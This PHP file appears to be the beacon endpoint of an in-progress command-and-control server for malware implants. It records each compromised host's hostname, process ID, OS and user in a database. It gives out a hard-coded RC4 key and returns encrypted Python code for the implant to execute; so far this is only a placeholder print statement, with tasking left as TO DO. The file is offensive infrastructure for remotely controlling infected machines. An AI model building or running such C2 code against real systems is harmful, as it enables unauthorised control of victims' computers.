<?php
    include "connector.php";
    include "rc4.php";

    #  JSON decodes implant POST data
    $post_data = json_decode(file_get_contents("php://input"), true);
    $hostname = $post_data["hostname"];
    $process_id = $post_data["process_id"];
    $os = $post_data["os"];
    $current_user = $post_data["current_user"];

    # Gets current time in UTC (will be used for updating "Last Seen")
    $current_time = gmdate("Y-m-d H:i:s");

    # SQL statement to determine if this is a new or old beaconing host
    $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":process_id", $process_id);
    $statement->execute();
    $row_count = $statement->rowCount();

    # If new implant (initial beacon)
    if ($row_count == "0") {
        # Generates unique encryption key
        #$encryption_key = uniqid();
        $encryption_key = "123456";

        # Inserts an entry into the "implants" table
        $statement = $database_connection->prepare("INSERT INTO `implants` (`hostname`, `process_id`, `os`, `current_user`, `last_seen`, `encryption_key`) VALUES (:hostname, :process_id, :os, :current_user, :last_seen, :encryption_key)");
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":process_id", $process_id);
        $statement->bindValue(":os", $os);
        $statement->bindValue(":current_user", $current_user);
        $statement->bindValue(":last_seen", $current_time);
        $statement->bindValue(":encryption_key", $encryption_key);
        $statement->execute();

        # Echoes newly-generated encryption key in the HTTP response
        echo $encryption_key;
    }
    # Else old implant
    else {
        # TO DO: Check for taskings

        # TO DO: If taskings, echo appropriate Python code to accomplish the task

        # TO DO: Query for already-known encryption key instead of hard-coding
        $encryption_key = "123456";

        # TO DO: Actually dynamically-generate Python code here
        # The print statement is used as a PoC for testing/debugging purposes
        echo rc4($encryption_key, "print 't3ntman is the kewlest.'");
    }

    # Kills database connection
    $statement->connection = null;
?>
